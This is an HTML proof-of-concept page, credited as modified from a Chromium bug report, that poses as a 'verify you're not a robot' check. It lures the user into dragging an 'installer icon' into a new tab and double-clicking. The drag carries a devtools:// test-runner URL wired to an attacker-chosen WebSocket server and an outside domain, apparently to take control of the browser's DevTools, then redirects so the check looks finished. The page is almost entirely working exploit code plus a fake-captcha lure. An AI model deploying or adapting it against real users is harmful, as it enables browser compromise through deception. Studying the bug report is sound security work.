<body>
    <!-- Modified from https://crbug.com/40942152 by Matan Berson -->
    <div id="instructions">
        <h1>Please verify you're not a robot.</h1>
        <p>1. Drag the installer icon into a new tab:</p>
        <div draggable="true" id="dragElem"></div>
        <p>
            2. In the new tab, double-click on the installation link
            <br>(where it says "CLICK TWICE HERE")
        </p>
    </div>
    <script>
        var searchParams = (new URL(location.href)).searchParams;

        if (searchParams.get('ws')?.length) {
            var ws = searchParams.get('ws');
            var url = `devtools://devtools/bundled/integration_test_runner.html?inspected_test=https://aogarantiza.com&ws=${ws}&panel=network`;

            window.addEventListener('DOMContentLoaded', () => {
                dragElem.addEventListener('dragstart', (e) => {
                    e.dataTransfer.setData('text/plain', url);
                    setTimeout(() => {
                        dragElem.classList.add('dragging');
                    }, 30);
                });
                dragElem.addEventListener('dragend', () => {
                    dragElem.classList.remove('dragging');
                    setTimeout(() => {
                        if (document.visibilityState == 'hidden') {
                            window.location = 'https://example.com/?verified';                
                        }
                    }, 100);
                });
            });
        } else {
            instructions.innerText = 'Please specify ?ws=host:port parameter in URL with your WebSocket server';
            instructions.classList.add('error');
        }
    </script>
</body>
